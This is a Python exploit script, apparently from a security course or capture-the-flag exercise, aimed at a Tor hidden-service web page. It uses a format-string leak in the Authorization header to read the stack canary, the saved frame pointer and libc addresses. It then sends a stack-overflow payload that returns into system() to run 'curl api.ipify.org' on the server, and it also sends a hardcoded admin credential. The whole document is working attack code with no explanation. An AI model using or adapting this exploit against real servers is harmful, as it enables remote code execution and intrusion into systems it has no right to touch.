import requests
import subprocess
import sys
import os

# port used by tor
portNUMBER = sys.argv[1]

# what the name suggests
def convert_to_big_endian(str):
    reversi = bytearray.fromhex(str)
    reversi.reverse()
    newstr = ''.join(format(x, '02x') for x in reversi)
    return newstr.upper()

session = requests.session()
sockie = 'socks5h://localhost:'+ portNUMBER
session.proxies = {'http':  sockie}

url = "http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html"

headers={
    "Host":"xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "150",
    "Authorization": "Basic JTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eDo=",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1"
}

data = b'A'

# get stack data and keep the bytes we are interested in
reshi = session.post(url, headers=headers, data=data)

bytes_received = reshi.headers['WWW-Authenticate']
bytes_received = bytes_received.replace('Basic realm="Invalid user: ','').replace('"','').split()

# 31st byte is return address, 30th byte is the current saved ebp, etc
canary = bytes_received[26]
word_after_canary = bytes_received[28]
ebp = bytes_received[29]
return_address = bytes_received[30]

# in post_param() '=' is changed to '\0' (in hex)
canary = canary.replace('00','3D')

data = 'A'*8*13

# address of post_param() buffer
temp = int(ebp, 16) - 136
data += convert_to_big_endian(hex(temp).replace('0x',''))

# 1 word
data += 'A'*8

# canary
data += convert_to_big_endian(canary)

# 1 word after canary
data += convert_to_big_endian(word_after_canary) # write word after canary

# 1 word
data += 'A'*8

# ebp
data += convert_to_big_endian(ebp) # write saved ebp

# system-libc to execute cat
temp = int(bytes_received[27], 16) - 1685936
data += convert_to_big_endian(hex(temp).replace('0x',''))

# 1 word
data += 'A'*8

# argument of curl (buffer + argument)
temp = int(ebp, 16) - 136
temp = hex(temp)
temp = int(temp, 16) + 88
data += convert_to_big_endian(hex(temp).replace('0x',''))

# instead of cat curl
command= "curl api.ipify.org"

# append command to the end of the previous constructed data
final_construction_for_attack = data + command.encode("utf-8").hex()

# hex string as binary data
str_bin = bytes.fromhex(final_construction_for_attack)

with open("file.bin","wb") as f:
    f.write(str_bin)

curl = "curl --socks5-hostname localhost:"+portNUMBER
curl += " --max-time 33 --data-binary '@file.bin' --verbose --http0.9 'http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' --compressed -H 'Connection: keep-alive' -H 'Content-Length: 0' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Authorization: Basic YWRtaW46aGFtbWVydGltZQ=='"
_, answer = subprocess.getstatusoutput(curl)

# just to delete the binary file not needed anymore
os.remove("file.bin")

# the server's "answer"
print(answer)